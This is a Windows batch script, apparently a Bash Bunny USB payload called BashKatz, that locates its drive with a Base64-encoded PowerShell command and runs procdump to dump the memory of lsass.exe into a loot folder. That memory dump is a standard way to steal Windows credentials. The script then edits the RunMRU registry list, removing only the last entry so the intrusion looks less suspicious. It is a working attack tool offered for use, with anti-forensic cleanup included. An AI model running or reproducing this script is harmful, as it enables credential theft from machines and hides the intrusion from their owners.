@echo off
REM Script written by: Rob Emmerson (robemmerson)
cls

REM Tidy up autorun commands for CMD
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe" /f >nul 2>&1
reg delete "HKCU\Software\Microsoft" /v "exe" /f >nul 2>&1

REM Grab drive mount point - command encoded in Base64 to get around escaping values
for /f "delims=" %%a in ('powershell.exe -encodedCommand "KABnAHcAbQBpACAAdwBpAG4AMwAyAF8AdgBvAGwAdQBtAGUAIAAtAGYAIAAnAGwAYQBiAGUAbAA9ACIAQgBhAHMAaABCAHUAbgBuAHkAIgAnACkALgBOAGEAbQBlAA=="') do @set drive=%%a

REM Detect processor architecture and set switch position variable
reg query "HKLM\Hardware\Description\System\CentralProcessor\0" | find /i "x86" > NUL || set x64=64
if exist "%drive%\payloads\switch1\procdump%x64%.exe" (set switch=switch1) else (set switch=switch2)

REM Execute procdump using the correct switch and architecture
"%drive%\payloads\%switch%\procdump%x64%.exe" -accepteula -ma lsass.exe %drive%\loot\BashKatz\%computername%.dmp >nul 2>&1

REM Clean up the 'Run' list - only removes the last item as it's less suspicious
for /f "tokens=3 delims= " %%a in ('reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /v "MRUList" ^| find /i "REG_SZ"') do @set mru=%%a
set newmru=%mru:~1%
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /v "MRUList" /d %newmru% /f >nul 2>&1
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /v %mru:~0,1% /f >nul 2>&1
exit